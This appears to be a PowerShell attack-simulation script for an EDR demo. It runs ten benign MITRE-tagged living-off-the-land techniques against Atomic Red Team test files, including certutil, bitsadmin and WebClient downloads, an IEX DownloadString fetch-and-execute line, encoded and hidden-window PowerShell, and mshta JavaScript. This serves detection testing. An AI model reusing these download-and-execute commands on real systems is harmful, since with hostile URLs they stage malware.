# SECURITY TESTING SCRIPT - For Educational/Demo Purposes ONLY
# This script simulates LOLBin abuse techniques that EDR/AV should detect
# Run in a controlled lab environment (VM) ONLY
# Author: For Sentinel EDR Demo Project
# Date: 2025-12-31

Write-Host "========================================" -ForegroundColor Red
Write-Host "  SENTINEL EDR - ATTACK SIMULATION" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
Write-Host ""
Write-Host "WARNING: This script will trigger security alerts!" -ForegroundColor Yellow
Write-Host "Only run in a TEST environment (VM)!" -ForegroundColor Yellow
Write-Host ""
$confirm = Read-Host "Type 'YES' to continue"
if ($confirm -ne "YES") {
    Write-Host "Aborted." -ForegroundColor Green
    exit
}

Write-Host "`n[+] Starting attack simulation..." -ForegroundColor Cyan
Start-Sleep -Seconds 2

# Create a safe test directory
$testDir = "$env:TEMP\SentinelTest"
if (-not (Test-Path $testDir)) {
    New-Item -ItemType Directory -Path $testDir -Force | Out-Null
}

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 1: CertUtil Download (T1105)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: Malware download using CertUtil" -ForegroundColor White
Write-Host "Command: certutil -urlcache -split -f [URL]" -ForegroundColor Gray
Start-Sleep -Seconds 1

# Download a harmless text file (Atomic Red Team test file)
certutil -urlcache -split -f "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/T1105.txt" "$testDir\downloaded.txt"
Write-Host "[!] CertUtil download executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 2: Encoded PowerShell (T1059.001)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: Base64-encoded malicious PowerShell" -ForegroundColor White

# Encode a harmless command: Write-Host "HACKED BY ATTACKER"
$encodedCmd = "VwByAGkAdABlAC0ASABvAHMAdAAgACIASABBAEMASwBFAEQAIABCAFkAIABBAFQAVABBAEMASwBFAFIAIgA="
Write-Host "Command: powershell -EncodedCommand [BASE64]" -ForegroundColor Gray
Start-Sleep -Seconds 1

powershell.exe -NoProfile -EncodedCommand $encodedCmd
Write-Host "[!] Encoded PowerShell executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 3: Suspicious PowerShell Download (T1059.001)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: DownloadString (common malware technique)" -ForegroundColor White
Write-Host 'Command: IEX (New-Object Net.WebClient).DownloadString(...)' -ForegroundColor Gray
Start-Sleep -Seconds 1

# Download and execute a harmless script (just echoes text)
powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1')"
Write-Host "[!] PowerShell DownloadString executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 4: MSHTA Execution (T1218.005)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: MSHTA remote script execution" -ForegroundColor White
Write-Host "Command: mshta javascript:alert(...)" -ForegroundColor Gray
Start-Sleep -Seconds 1

# Execute harmless JavaScript that just creates a popup
mshta.exe "javascript:alert('Sentinel Alert Test');close()"
Write-Host "[!] MSHTA JavaScript executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 5: BITSAdmin Transfer (T1197)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: Stealth file download using BITS" -ForegroundColor White
Write-Host "Command: bitsadmin /transfer myJob [URL]" -ForegroundColor Gray
Start-Sleep -Seconds 1

# Download a harmless file using BITS
bitsadmin /transfer SentinelTest /download /priority foreground "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/src/T1197.txt" "$testDir\bits_download.txt"
Write-Host "[!] BITSAdmin transfer executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 6: Suspicious Process Execution (T1059.003)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: cmd.exe spawning PowerShell (common malware pattern)" -ForegroundColor White
Start-Sleep -Seconds 1

cmd.exe /c "powershell.exe -NoProfile -Command Write-Host 'Suspicious parent-child process chain'"
Write-Host "[!] Suspicious process chain executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 7: Encoded Command via CMD (T1027)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: Obfuscated command execution" -ForegroundColor White
Start-Sleep -Seconds 1

# Run a harmless but suspicious-looking command
powershell.exe -NoProfile -WindowStyle Hidden -Command "Write-Host 'Hidden Window Execution'"
Write-Host "[!] Hidden window execution completed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 8: Net.WebClient Usage (T1105)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: Direct WebClient file download" -ForegroundColor White
Start-Sleep -Seconds 1

powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/T1105.txt', '$testDir\webclient_download.txt')"
Write-Host "[!] WebClient download executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 9: Invoke-Expression (IEX) (T1059.001)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: IEX used to execute code from variable" -ForegroundColor White
Start-Sleep -Seconds 1

powershell.exe -Command "`$code='Write-Host SentinelIEXTest'; IEX `$code"
Write-Host "[!] Invoke-Expression (IEX) executed!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Magenta
Write-Host "TEST 10: Suspicious Registry Access (T1112)" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host "Simulating: Reading common persistence registry keys" -ForegroundColor White
Start-Sleep -Seconds 1

reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Out-Null
Write-Host "[!] Registry persistence key queried!" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "`n========================================" -ForegroundColor Green
Write-Host "  SIMULATION COMPLETE" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "All attack simulations executed successfully!" -ForegroundColor Cyan
Write-Host ""
Write-Host "Your Sentinel Agent should have detected:" -ForegroundColor Yellow
Write-Host "  [1] CertUtil file download" -ForegroundColor White
Write-Host "  [2] Encoded PowerShell commands" -ForegroundColor White
Write-Host "  [3] PowerShell DownloadString" -ForegroundColor White
Write-Host "  [4] MSHTA JavaScript execution" -ForegroundColor White
Write-Host "  [5] BITSAdmin stealth transfer" -ForegroundColor White
Write-Host "  [6] Suspicious process chains" -ForegroundColor White
Write-Host "  [7] Hidden window execution" -ForegroundColor White
Write-Host "  [8] Net.WebClient downloads" -ForegroundColor White
Write-Host "  [9] Invoke-Expression (IEX)" -ForegroundColor White
Write-Host "  [10] Registry persistence queries" -ForegroundColor White
Write-Host ""
Write-Host "Check your Kafka topic 'threats' for alerts!" -ForegroundColor Cyan
Write-Host "Check Sysmon Event ID 1 in Event Viewer" -ForegroundColor Cyan
Write-Host "Check PowerShell Event ID 4104 for script blocks" -ForegroundColor Cyan
Write-Host ""
Write-Host "Cleanup: Test files created in $testDir" -ForegroundColor Gray
